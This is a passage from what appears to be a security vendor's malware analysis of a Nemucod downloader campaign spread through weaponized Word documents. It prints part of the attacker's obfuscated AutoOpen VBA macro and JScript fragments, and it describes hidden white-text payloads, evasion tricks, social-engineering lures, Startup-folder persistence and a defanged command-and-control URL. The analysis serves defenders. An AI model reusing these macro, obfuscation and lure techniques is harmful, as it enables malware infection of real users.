.Add "g1", "angul_tryingI=0.669;angul_something=0.105;angul_never6=0.879;angul_shes=913;angul_aware8=0.663;angul_said=846;angul_cold=739;angul_life7=0.927;angul_dare3=370;angul_sees=0.96;angul_whole8=0.31;angul_yourself=707;angul_goneShe=0.21;var angul_stayEven1"
.Add "g2", "={_lo3:'\u0045'}._lo3+{_m1:'\u006e'}._m1+{_d2:'\u0074'}._d2+{_1:'\u0065'}._1+{_th3:'\u0072'}._th3+{_ah1:'\u0020'}._ah1+{_re1:'\u0074'}._re1+{_d0:'\u0068'}._d0+{_0:'\u0065'}._0+{_K3:'\u0020'}._K3+{_wi1:'\u0074'}._wi1+{_n1:'\u0065'}._n1+{_w1:'\u0078'}."
.Add "g3", "_w1+{_re0:'\u0074'}._re0+{_sh3:'\u0020'}._sh3+{_0:'\u0074'}._0+{_t3:'\u006f'}._t3+{_y2:'\u0020'}._y2+{_1:'\u0065'}._1+{_pr0:'\u006e'}._pr0+{_w1:'\u0063'}._w1+{_j2:'\u006f'}._j2+{_h0:'\u0064'}._h0+{_fa1:'\u0065'}._fa1+{_3:'\u0020'}._3+{_j0:'\u0074'}._"
</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-2">2</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-4">4</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-6">6</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-8">8</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-10">10</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-12">12</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-14">14</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-16">16</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-18">18</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-20">20</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-22">22</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-24">24</div><div class="crayon-num" data-line="crayon-5f69287a8acf7072397075-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8acf7072397075-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8acf7072397075-1"><span class="crayon-h"> </span><span class="crayon-e">Sub </span><span class="crayon-e">AutoOpen</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-2">&nbsp;</div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-3"><span class="crayon-s">'==========================================================================</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-4"><span class="crayon-s">Dim objSysInfo: Set objSysInfo = CreateObject("WinNTSystemInfo")</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-5"><span class="crayon-s">Dim objFSO:&nbsp;&nbsp;&nbsp;&nbsp; Set objFSO = CreateObject("Scripting.FileSystemObject")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-6"><span class="crayon-s">Dim objShell:&nbsp;&nbsp; Set objShell = CreateObject("Shell.Application")</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-7"><span class="crayon-s">Dim objDic:&nbsp;&nbsp;&nbsp;&nbsp; Set objDic = CreateObject("Scripting.Dictionary")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-8"><span class="crayon-s">Dim objPO:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set objPO = CreateObject("Scripting.Dictionary")</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-9"><span class="crayon-s">Dim wsh:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Set wsh = VBA.CreateObject("WScript.Shell")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-10"><span class="crayon-s">'</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">===</span><span class="crayon-o">==</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-12"><span class="crayon-e">Dim </span><span class="crayon-e">filepath </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">filepath</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Empty</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-13"><span class="crayon-e">Dim </span><span class="crayon-e">tempcode12 </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">tempcode12</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Empty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-14"><span class="crayon-e">Dim </span><span class="crayon-e">hash12 </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">hash12</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Empty</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-15"><span class="crayon-e">Dim </span><span class="crayon-e">strComputerName </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">strComputerName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Empty</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-16"><span class="crayon-e">Dim </span><span class="crayon-v">objFile</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">empty12</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">filets</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ver</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">out1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">proc</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-17"><span class="crayon-e">Dim </span><span class="crayon-v">hash</span><span class="crayon-p">#, upper&amp;amp;, i&amp;amp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-18"><span class="crayon-e">Dim </span><span class="crayon-v">now</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">mimi </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-t">Long</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-19"><span class="crayon-m">Const</span><span class="crayon-h"> </span><span class="crayon-v">max</span><span class="crayon-p"># = 2 ^ 31</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-20">&nbsp;</div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-22"><span class="crayon-e">With </span><span class="crayon-i">objDic</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-23"><span class="crayon-sy">.</span><span class="crayon-i">Add</span><span class="crayon-h"> </span><span class="crayon-s">"g1"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"angul_tryingI=0.669;angul_something=0.105;angul_never6=0.879;angul_shes=913;angul_aware8=0.663;angul_said=846;angul_cold=739;angul_life7=0.927;angul_dare3=370;angul_sees=0.96;angul_whole8=0.31;angul_yourself=707;angul_goneShe=0.21;var angul_stayEven1"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-24"><span class="crayon-sy">.</span><span class="crayon-i">Add</span><span class="crayon-h"> </span><span class="crayon-s">"g2"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"={_lo3:'\u0045'}._lo3+{_m1:'\u006e'}._m1+{_d2:'\u0074'}._d2+{_1:'\u0065'}._1+{_th3:'\u0072'}._th3+{_ah1:'\u0020'}._ah1+{_re1:'\u0074'}._re1+{_d0:'\u0068'}._d0+{_0:'\u0065'}._0+{_K3:'\u0020'}._K3+{_wi1:'\u0074'}._wi1+{_n1:'\u0065'}._n1+{_w1:'\u0078'}."</span></div><div class="crayon-line" id="crayon-5f69287a8acf7072397075-25"><span class="crayon-sy">.</span><span class="crayon-i">Add</span><span class="crayon-h"> </span><span class="crayon-s">"g3"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"_w1+{_re0:'\u0074'}._re0+{_sh3:'\u0020'}._sh3+{_0:'\u0074'}._0+{_t3:'\u006f'}._t3+{_y2:'\u0020'}._y2+{_1:'\u0065'}._1+{_pr0:'\u006e'}._pr0+{_w1:'\u0063'}._w1+{_j2:'\u006f'}._j2+{_h0:'\u0064'}._h0+{_fa1:'\u0065'}._fa1+{_3:'\u0020'}._3+{_j0:'\u0074'}._"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8acf7072397075-26"></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>Figure 15: Obfuscated JScript code stored in VBA code</p>
<p>Since the von November 30<sup>th</sup> the VBA code has been replaced by less than 10 lines of code, as in Figure 16, that simply reads the text contents of the word document and writes it to the .JSE file. Over time the obfuscation of this smaller VBA code changed slightly to make string and signature-based detection difficult by over-complicated code syntax and by strings, such as filenames, being split and joined at run-time.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29891" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11.png" alt="nemucod_11" width="904" height="256" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11.png 904w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11-900x255.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11-300x85.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11-768x217.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_11-370x105.png 370w" sizes="(max-width: 904px) 100vw, 904px" /></a></p>
<p>Figure 16: VBA code to retrieve obfuscated JScript code stored in document body</p>
<p>As can be seen in the code in Figure 16, the .JSE file will be written to disk in the same folder where the document resides and with the same filename as the document but having the .JSE extension. For a file named foobar.doc located on the desktop a file foobar.doc.jse will appear on the desktop.</p>
<p>The VBA code ActiveDocument.Content.Text is responsible for retrieving the obfuscated JScript content from the Word document, which in the case of one version highlighted in Figure 17, is 24 pages long but as you can see in the same figure, the document looks blank. Selecting-all in the 24 pages reveals more and changing the font colour to something other than white reveals the malicious code, as shown in Figure 18.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_12.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29867" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_12.png" alt="nemucod_12" width="890" height="634" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_12.png 890w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_12-300x214.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_12-768x547.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_12-370x264.png 370w" sizes="(max-width: 890px) 100vw, 890px" /></a></p>
<p>Figure 17: Post November 30<sup>th</sup> version showing 24 pages of blank content.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_13.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29843" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_13.png" alt="nemucod_13" width="871" height="618" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_13.png 871w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_13-300x213.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_13-768x545.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_13-370x263.png 370w" sizes="(max-width: 871px) 100vw, 871px" /></a></p>
<p>Figure 18: Revealing the hidden malicious code.</p>
<p>There could be numerous reasons for this change of moving the JSE code from within VBA to the document text, one of which could be simplicity for the actors, as per their shift from using their custom cipher code for obfuscation to Microsofts Script Encoder, which gave them less code to maintain. Another could be to throw off antivirus scanners and tools that use heuristics to evaluate the suspiciousness of files for which a 24-page document with content and a small amount of VBA code might look less suspicious than a 1-page, no-content document with 100s of lines of VBA code.</p>
<p>It could also be a social engineering technique as victims may be inclined to click on the Enable Content button if they believe the document has content but cannot see it. Of course, clicking this button would instead result in the VBA code being executed.</p>
<p><strong><span lang="EN-GB">Practice makes perfect</span></strong></p>
<p>Continuing along the Figure 5 timeline into December, around the middle of the month a version appeared that made use of the Security Permissions in Office applications to prevent unauthorised changes, such as marking areas of the document read-only, which also prohibits changing the font colour of the document text. However, such document permissions dont stretch to Data Loss Prevention (DLP) capabilities so its possible to select the document text content and copy &amp; paste into another application to retrieve the malicious code. Figure 19 shows the difference in document properties between versions pre (left) and post (right) permission changes that occurred on the December 18<sup>th</sup> version. Only a couple of the 20+ versions after December 18<sup>th</sup> were missing these permissions with no obvious evidence (e.g. new author, major code release, day of the week etc) to explain why but given the consistency with the others using permission its possible a human error occurred or the actors release process failed to check whether permissions were set.</p>
<p><img class="alignnone wp-image-30212" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19.png" alt="fig19" width="659" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19.png 1462w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19-900x410.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19-300x137.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19-768x350.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19-1024x466.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig19-370x169.png 370w" sizes="(max-width: 659px) 100vw, 659px" /></p>
<p>Figure 19: Word document permissions missing (left) in earlier versions and present in most later versions (right)</p>
<p>In the week between Christmas and New Year  you know, that time where youve eaten too much, perhaps drunk too much and work, and the world in general, tends to be in go-slow mode  you would be an attackers perfect recipient of some unwanted phishing emails to take advantage of your stupor. On Wednesday December 28<sup>th</sup> a new version was created that boosted the social engineering capabilities of this malware.</p>
<p>Figure 20 shows the addition of a fake message claiming that the document was edited in a later version of Word and to view it, the recipient should click Enable Content. The festive period aside, its likely the actors were trying to stimulate the growth of their victim base with such tactics.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_16.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-29771" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_16.png" alt="nemucod_16" width="344" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_16.png 631w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_16-300x262.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_16-370x323.png 370w" sizes="(max-width: 344px) 100vw, 344px" /></a></p>
<p>Figure 20: Social engineering used to entice victims to run their malicious macro code.</p>
<p>Since the beginning of 2017 we have seen a few versions including VBA GUI Form elements, as shown in the Figure 21. Currently the form, elements and skeleton code behind the scenes do nothing so one can only presume this is yet another measure to create a sense of legitimacy and perhaps throw some antivirus solutions off the scent by making the macro code seem quite benign. The use of GUIs is quite uncommon in malware as actors often dont want to interact with victims and raise suspicion, unless to ask for ransom payments but theres no indication of such payloads being used with these downloaders yet, nor any sense of these forms looking anything like typical ransomware ransom messages.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_17.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-29747" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_17.png" alt="nemucod_17" width="397" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_17.png 531w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_17-300x227.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_17-370x279.png 370w" sizes="(max-width: 397px) 100vw, 397px" /></a></p>
<p>Figure 21: VBA Forms including GUI elements in some recent versions.</p>
<p>About one week after the first version to include VBA Form GUI elements another version emerged this time showing, albeit it in a faded grey colour, the encoded JScript code within the document text, as shown in Figure 22. Perhaps this is another lure technique to have victims click Enable Content believing the text may be enabled and turn to the default black colour or look less like garbled text.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_18.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-29723" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_18.png" alt="nemucod_18" width="676" height="301" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_18.png 676w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_18-300x134.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_18-370x165.png 370w" sizes="(max-width: 676px) 100vw, 676px" /></a></p>
<p>Figure 22: Grey, faded font properties used</p>
<p>Approaching the end of the current Figure 5 attack timeline now, some new versions seen around mid-January included a VBA code change to use Words <strong>AutoClose</strong> macro function instead of <strong>AutoOpen</strong> as used in all previous versions. The technical effect of this change should be quite obvious but the effect from a social engineering perspective and one of delaying or avoiding raising suspicion to the victim might be less obvious.</p>
<p>Quite often when weaponized documents like these are opened or enabled (Enable Content has been clicked) the effect is immediate  CPU spikes, ransom messages appear, network connections are made and so on. It may not be obvious that something untoward is happening but often hard drive noises, CPU fans or other indicators tell you otherwise. In this case however, the user could open the document safely, even click the Enable Content button and still remain safe and if no tell-tale signs of infection occur one might think all is well. Closing the document, or the Word application itself, however would trigger the infection routine by which point you may have felt a sense of relief nothing had happened. Short lived.</p>
<p>Some other points listed in the Figure 5 timeline worth discussing include the Operating System version, Code page and the Authors. Throughout the evolution of all the weaponized document versions all but two, according to their meta-data, were created using Word on a Windows 5.1 (XP) operating system; Windows 6.1 (Windows 7) was used for the two outliers. Incidentally, the two versions created on Windows 7 introduced two new Authors as well.</p>
<p>Author Till3 appeared approximately one month after the first version and created their version on the 25<sup>th</sup> November, made 3 revisions to the content and last saved the document some 13 minutes after creating it. This version was one of the last of the original types where the JSE code was stored statically in the VBA code.</p>
<p>Author Nish appeared several versions later, around 14<sup>th</sup> December, making hardly any revisions and spending almost no time editing the document but doing so also on a Windows 7 host.</p>
<p>As for the rest of the authors, and their Windows XP systems, Figure 23 shows that most of the versions  over half  were created by authors with no names while Victor created almost a quarter and the rest were split in similar small numbers between John, Mike, Martin and two previously mentioned, Till3 and Nish.</p>
<p>Interestingly, it seems Victor played a much larger role in the final saves, and possibly edits, of over three quarters of all versions perhaps indicating him as a more senior member of the group or a team leader of sorts.</p>
<p><img class="alignnone wp-image-30236" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23.png" alt="fig23" width="661" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23.png 1674w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23-900x409.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23-300x136.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23-768x349.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23-1024x465.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/fig23-370x168.png 370w" sizes="(max-width: 661px) 100vw, 661px" /></p>
<p>Figure 23: Author names (left), last saved names (right).</p>
<p>All versions of the weaponized documents gathered thus far share the same <a href="https://msdn.microsoft.com/en-us/library/cc195053.aspx">Code Page, 1251</a>, which is designed to cover languages that use Cyrillic script, such as Russian, Bulgarian, Serbian Cyrillic and some other similar languages.</p>
<p>As shown in Figure 24 below, December was the busiest month for the actors who released close to 30 versions  almost one a day. Its hard to know why the change in rates over the different months other than to say that clearly lots of churn was happening to various aspects of their malware and delivery mechanisms, which may have led to slightly higher numbers earlier on. As previously mentioned, and as described in <a href="http://researchcenter.paloaltonetworks.com/2017/04/unit42-oilrig-actors-provide-glimpse-development-testing-efforts/">our recent blog</a> providing a glimpse into how the OilRig actors develop and test their malware in an attempt to remain undetected and to carry out multiple attacks without having to completely retool, these threat actors have shown during this Nemucod campaign their quite rapid development process that added features, ensured minimal detection rates by using obfuscation and other methods, and their enhancements in social engineering techniques to lure new victims.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_21.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-29651" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_21.png" alt="nemucod_21" width="493" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_21.png 750w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_21-300x182.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_21-370x225.png 370w" sizes="(max-width: 493px) 100vw, 493px" /></a></p>
<p>Figure 24: Number of versions per month</p>
<p><strong>The JSE Payload</strong></p>
<p>Assuming the weaponized documents macro code has executed the encoded, heavily obfuscated JScript code will be saved to disk and executed. One of the first behaviours observed is that of a fake error message box, such as the example in Figure 25. Message text varies but follows a theme of reporting something seemingly legitimate failed to run  another false sense of security for the victim.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_22.png" rel="wpdevart_lightbox"><img class="alignnone wp-image-29627" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_22.png" alt="nemucod_22" width="460" height="300" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_22.png 590w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_22-300x196.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/Nemucod_22-370x241.png 370w" sizes="(max-width: 460px) 100vw, 460px" /></a></p>
<p>Figure 25: Fake error message opened as part of the JSE execution</p>
<p>The vast majority of versions copy the JSE file to the Windows Startup Folder, as shown below, to ensure the code runs with every system reboot.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8ad01131039260" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Start 
Menu\Programs\Startup\</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a8ad01131039260-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a8ad01131039260-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a8ad01131039260-1"><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Users</span><span class="crayon-sy">\</span><span class="crayon-o">&lt;</span><span class="crayon-v">username</span><span class="crayon-o">&gt;</span><span class="crayon-sy">\</span><span class="crayon-v">AppData</span><span class="crayon-sy">\</span><span class="crayon-v">Roaming</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Start </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a8ad01131039260-2"><span class="crayon-v">Menu</span><span class="crayon-sy">\</span><span class="crayon-v">Programs</span><span class="crayon-sy">\</span><span class="crayon-v">Startup</span><span class="crayon-sy">\</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The JSE code uses various obfuscation routines and techniques to hinder analysis, including the use of Unicode characters in place of the ASCII character equivalent when declaring some variable names and for some strings. Converting these characters back to ASCII as part of the de-obfuscation process reveals some content that provides useful entry points for further analysis, an example of which includes the variable name \u0075\u0072\u006c\u0031\u0032, which translates in ASCII to url12.</p>
<p>In one version this variable is initialized with the following code, which decodes at run-time to the following URL string https://185.159.82[.]11:3333/P/tipster.php?.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a8ad04887236854" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
